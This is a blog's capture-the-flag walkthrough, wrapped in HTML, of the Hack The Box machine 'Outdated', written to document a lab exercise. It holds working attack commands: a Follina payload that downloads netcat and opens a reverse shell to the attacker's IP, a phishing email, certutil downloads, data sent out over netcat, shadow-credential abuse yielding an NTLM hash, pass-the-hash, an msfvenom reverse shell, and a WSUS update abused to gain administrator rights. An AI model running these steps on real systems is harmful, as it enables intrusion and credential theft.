@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Outdated [Medium] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Outdated [Medium]"/>
+<meta name="twitter:description" content="Scanning &gt; TARGET=10.129.106.70 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION25/tcp open smtp syn-ack ttl 127 hMailServer smtpd| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-15 04:40:23Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated."/>
+
+    <meta property="og:title" content="HTB - Outdated [Medium]" />
+<meta property="og:description" content="Scanning &gt; TARGET=10.129.106.70 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION25/tcp open smtp syn-ack ttl 127 hMailServer smtpd| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-15 04:40:23Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/outdated/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-08-14T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-08-14T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Outdated [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 14, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          6 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">Scanning</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.106.70 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT      STATE SERVICE       REASON          VERSION
+25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
+| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-15 04:40:23Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-08-15T04:42:09+00:00; +6h59m56s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
+3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
+|_ssl-date: 2022-08-15T04:42:08+00:00; +6h59m56s from scanner time.
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8530/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn&#39;t have a title.
+8531/tcp  open  unknown       syn-ack ttl 127
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49884/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49903/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49924/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+</code></pre><ul>
+<li>Found some domains, add to /etc/hosts</li>
+</ul>
+<pre tabindex="0"><code>10.129.106.70    outdated.htb  mail.outdated.htb
+</code></pre><h1 id="enum">Enum</h1>
+<ul>
+<li>SMB</li>
+</ul>
+<pre tabindex="0"><code>&gt; enum4linux outdated.htb
+Domain Name: OUTDATED
+Domain Sid: S-1-5-21-4089647348-67660539-4016542185
+
+&gt; smbclient -N -L outdated.htb                  
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+Shares          Disk      
+SYSVOL          Disk      Logon server share 
+UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
+WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
+WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
+
+# RPC
+&gt; rpcdump.py -target-ip 10.129.106.70 outdated.htb &gt; rpcdump.txt
+
+# kerbute
+&gt; kerbrute userenum -d outdated.htb --dc 10.129.106.70 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
+2022/08/14 18:47:52 &gt;  [+] VALID USERNAME:       guest@outdated.htb
+2022/08/14 18:49:16 &gt;  [+] VALID USERNAME:       administrator@outdated.htb
+
+&gt; kerbrute bruteuser -d outdated.htb /usr/share/wordlists/rockyou.txt guest
+</code></pre><h1 id="shares">shares</h1>
+<pre tabindex="0"><code>&gt; smbclient -N \\\\outdated.htb\\Shares
+smb: \&gt; ls
+  .                                   D        0  Mon Jun 20 11:01:33 2022
+  ..                                  D        0  Mon Jun 20 11:01:33 2022
+  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022
+
+                9116415 blocks of size 4096. 1440211 blocks available
+smb: \&gt; get NOC_Reminder.pdf
+getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (33.8 KiloBytes/sec) (average 33.8 KiloBytes/sec)
+</code></pre><ul>
+<li>Read the pdf, <code>itsupport@outdated.htb</code> is a valid address and it takes links</li>
+<li>Found a list of unpateched vulnerabilities, <code>CVE-2022-30190</code> is exploitable.</li>
+<li><a href="https://github.com/JohnHammond/msdt-follina">https://github.com/JohnHammond/msdt-follina</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Change line 110</span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;Invoke-WebRequest http://10.10.16.15/nc64.exe -OutFile C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Tasks</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">nc.exe; C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Tasks</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">nc.exe -e cmd.exe 10.10.16.15 </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>reverse<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span></code></pre></div><ul>
+<li>Send email</li>
+</ul>
+<blockquote>
+<p>swaks &ndash;to <a href="mailto:itsupport@outdated.htb">itsupport@outdated.htb</a> &ndash;from meow@meow &ndash;server mail.outdated.htb &ndash;body &ldquo;http://10.10.16.15/&rdquo;</p>
+</blockquote>
+<h1 id="user-sflowers">user: sflowers</h1>
+<pre tabindex="0"><code>&gt; C:\Users\btables\Desktop&gt;net users /domain
+net users /domain
+The request will be processed at a domain controller for domain outdated.htb.
+
+
+User accounts for \\DC.outdated.htb
+
+-------------------------------------------------------------------------------
+Administrator            btables                  Guest                    
+krbtgt                   sflowers                 
+The command completed successfully.
+</code></pre><ul>
+<li>Upload winpeas, found <code>wsus</code> running</li>
+</ul>
+<pre tabindex="0"><code>&gt; certutil.exe -urlcache -f http://10.10.16.15:8888/p.exe p.exe
+
+[+] Checking WSUS
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+    WSUS is using http: http://wsus.outdated.htb:8530
+    [i] You can test https://github.com/pimps/wsuxploit to escalate privileges
+    But UseWUServer is equals to , so it may work or not
+</code></pre><h1 id="bloodhound">bloodhound</h1>
+<ul>
+<li>run sharphound on the target</li>
+</ul>
+<pre tabindex="0"><code>&gt; certutil.exe -urlcache -f http://10.10.16.15:8888/SharpHound.exe SharpHound.exe
+&gt; SharpHound.exe -c All --zipfilename output.zip
+&gt; nc.exe 10.10.16.15 5555 &lt; output.zip
+</code></pre><ul>
+<li>Analyse the output finds that btables belongs to the group it staff, and it staff has the privilege to AddCredentialLink to the user sflowers, who has psremote access to the DC.</li>
+</ul>
+<h1 id="shadow-credential-attack">Shadow credential attack</h1>
+<ul>
+<li>Follow this guide <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials</a></li>
+<li>Upload binaries for the attack</li>
+<li><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; certutil.exe -urlcache -f http://10.10.16.15:8888/Whisker.exe Whisker.exe
+&gt; certutil.exe -urlcache -f http://10.10.16.15:8888/Rubeus.exe Rubeus.exe
+&gt; Whisker.exe add /target:sflowers
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password EeiO2gCCHgK5oiE4
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID a9b5f7d0-02aa-4059-9a13-8b1adc5555ff
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:sflowers /certificate:&lt;base64-cert&gt; /password:&#34;el84kTr1afLpoMWG&#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+&gt; Rubeus.exe asktgt /user:sflowers /certificate:&lt;base64-cert&gt; /password:&#34;el84kTr1afLpoMWG&#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
+[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;outdated.htb\sflowers&#39;
+[*] Using domain controller: 172.16.20.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+  &lt;base64-cert&gt;
+
+  ServiceName              :  krbtgt/outdated.htb
+  ServiceRealm             :  OUTDATED.HTB
+  UserName                 :  sflowers
+  UserRealm                :  OUTDATED.HTB
+  StartTime                :  8/15/2022 8:14:44 AM
+  EndTime                  :  8/15/2022 6:14:44 PM
+  RenewTill                :  8/22/2022 8:14:44 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  SttuGPI9lPahkYurkK8WUA==
+  ASREP (key)              :  C05C572660D227E2469ED5A20B141693
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
+</code></pre><h1 id="foothold-sflowers">foothold: sflowers</h1>
+<ul>
+<li>Now, login as the user sflowers and get the flag</li>
+</ul>
+<blockquote>
+<p>evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5</p>
+</blockquote>
+<h1 id="pe-admin">pe: admin</h1>
+<ul>
+<li>re-run sharphound, this is already the shortest path, no more hops needed</li>
+</ul>
+<pre tabindex="0"><code>&gt; SharpHound.exe -c All --zipfilename output.zip
+&gt; download C:\Users\sflowers\desktop\20220815091017_output.zip /root/workspace/Outdated/output.zip
+</code></pre><ul>
+<li>Check that update uses a non https wsus server</li>
+</ul>
+<pre tabindex="0"><code>&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+    WUServer    REG_SZ    http://wsus.outdated.htb:8530
+&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+    UseWUServer    REG_DWORD    0x1
+</code></pre><h1 id="wsus-attack">wsus attack</h1>
+<ul>
+<li>i&rsquo;m not a big fan of powershell, so i generated a reverse shell for easier operation (evil-winrm is also slower)</li>
+</ul>
+<pre tabindex="0"><code>&gt; msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=4444 -f exe &gt; payload.exe
+</code></pre><h1 id="sharpwsus">SharpWSUS</h1>
+<ul>
+<li>To exploit the vulnerability, use a tool called SharpWSUS, which will create an update and approve it for deployment to a machine, i.e dc.outdated.htb</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; SharpWSUS.exe create /payload:&#34;C:\Users\sflowers\Desktop\PsExec64.exe&#34; /args:&#34;-accepteula -s -d cmd.exe /c \&#34;net localgroup administrators sflowers /add\&#34;&#34; /title:&#34;meowmeow&#34;
+&gt; SharpWSUS.exe approve /updateid:0be19bc9-b3db-4186-915d-622e9789b272 /computername:dc.outdated.htb /groupname:&#34;meowgroup&#34;
+&gt; SharpWSUS.exe check /updateid:0be19bc9-b3db-4186-915d-622e9789b272 /computername:dc.outdated.htb
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
